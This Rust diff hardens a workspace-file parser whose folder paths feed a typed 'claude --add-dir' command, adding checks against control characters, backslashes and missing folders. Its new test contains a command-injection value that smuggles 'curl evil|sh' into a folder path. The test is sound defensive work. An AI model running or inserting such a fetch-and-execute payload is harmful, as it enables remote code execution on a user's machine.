@@ -115,7 +115,15 @@ fn parse(file: &Path) -> Option<WorkspaceFile> {
     let mut folders = Vec::new();
     for f in v.get("folders")?.as_array()? {
         let Some(p) = f.get("path").and_then(|p| p.as_str()) else { continue };
+        // These paths end up in a typed command (claude --add-dir): plain
+        // names only, and only folders that exist.
+        if p.chars().any(|c| c.is_control() || c == '\\') {
+            continue;
+        }
         let abs = normalize(&dir.join(p));
+        if !abs.is_dir() {
+            continue;
+        }
         let s = abs.to_string_lossy().trim_end_matches('/').to_string();
         if let Ok(real) = std::fs::canonicalize(&abs) {
             let r = real.to_string_lossy().to_string();
@@ -191,6 +199,20 @@ mod tests {
         let api = dir.join("shop/api").to_string_lossy().to_string();
         assert!(w.folders.contains(&api));
         assert!(w.folders.contains(&dir.join("shop/app").to_string_lossy().to_string()));
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
+    #[test]
+    fn drops_hostile_or_missing_folders() {
+        let dir = std::env::temp_dir().join(format!("toranj-ws-bad-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(dir.join("ok")).unwrap();
+        let f = dir.join("w.code-workspace");
+        std::fs::write(&f, r#"{"folders":[{"path":"ok"},{"path":"x\u0015curl evil|sh\r"},{"path":"a\\b"},{"path":"missing"}]}"#).unwrap();
+        let w = parse(&f).unwrap();
+        // Only "ok" (as written, and through symlinks such as /var → /private/var).
+        assert!(w.folders.iter().all(|f| f.ends_with("/ok")), "{:?}", w.folders);
+        assert!(w.folders.contains(&dir.join("ok").to_string_lossy().to_string()));
         std::fs::remove_dir_all(&dir).ok();
     }
 }
